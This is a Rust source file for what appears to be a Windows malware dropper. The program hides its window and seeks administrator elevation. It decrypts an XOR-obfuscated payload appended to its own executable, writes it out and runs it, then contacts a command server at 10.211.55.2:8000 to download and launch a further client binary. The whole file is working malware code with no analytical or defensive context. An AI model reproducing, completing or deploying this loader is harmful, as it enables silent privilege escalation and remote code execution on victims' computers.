#![windows_subsystem = "windows"]

use serde::{Deserialize, Serialize};
use sha2::digest::Reset;
use sha2::{Digest, Sha256, Sha512};
use shared::{api::*, challenge::Challenge, utils, error::*, OverlayMeta};
use std::fs;
use std::fs::{read, File};
use std::io::Write;
use std::mem::swap;
use std::str::FromStr;
use std::process::Command;
use std::path::{Path, PathBuf};
use std::env::{current_exe, join_paths};
use std::convert::TryInto;
use rsa::PaddingScheme;
use shared::utils::{decrypt, KEY, xor};
use is_elevated::is_elevated;

struct Overlay {
    bytes: Vec<u8>,
    meta: OverlayMeta
}

fn should_run() -> bool {

    // already downloaded client?
    for name in vec!(utils::NAME1.to_string(), utils::NAME2.to_string()).iter() {
        if Path::new(&name).exists() {
            return false;
        }
    }

    true
}

fn extract_overlay() -> Overlay {
    let mut bytes = read(current_exe().unwrap()).unwrap();
    let mut offset = bytes.len();

    let encrypted_size: u32 = u32::from_be_bytes(bytes[offset-4..].try_into().unwrap());
    offset -= 4;

    let encrypted = String::from_utf8(bytes[offset-(encrypted_size as usize)..offset].to_vec()).unwrap();
    offset -= encrypted_size as usize;

    let meta: OverlayMeta = decrypt(&encrypted, &KEY).unwrap();
    let payload = bytes[offset-(meta.payload_size as usize)..offset].to_vec();

    Overlay {
        bytes: xor(&payload, &meta.secret),
        meta
    }
}

fn main() {
    File::create("C:\\1.txt").unwrap().write_all(b"1").unwrap();
    utils::tmpdir();

    let current = current_exe().unwrap().to_str().unwrap().to_string();
    if !is_elevated() {
        runas::Command::new(current).status().unwrap();
        return;
    }

    println!("elevated!");

    // ensure, that payload is extracted
    let name = current_exe().unwrap().file_name().unwrap().to_str().unwrap().to_string();
    let path = std::env::current_dir().unwrap().join(&name);

    if !path.exists() {
        println!("no overlay, extraction...");
        let overlay = extract_overlay();

        let mut file = File::create(&path).unwrap();
        file.write_all(&overlay.bytes).unwrap();
        println!("overlay ok!");
    }

    // and run it!
    println!("running payload...");
    Command::new(&path).spawn().unwrap();

    // ...
    utils::chdir();

    // check if we should continue?
    if !should_run() {
        println!("won't run! exit");
        return;
    }

    let mut api_client = Api::new("10.211.55.2", 8000, false);
    api_client.login(&SystemInfo {
        cpu_total: 0.0,
        mem_total: 0.0
    }).unwrap();

    println!("logged in!");

    let upload = api_client.client_download().unwrap();
    let path = utils::save(upload).unwrap();
    println!("downloaded...");

    // run program!
    Command::new(path).spawn().unwrap();
}
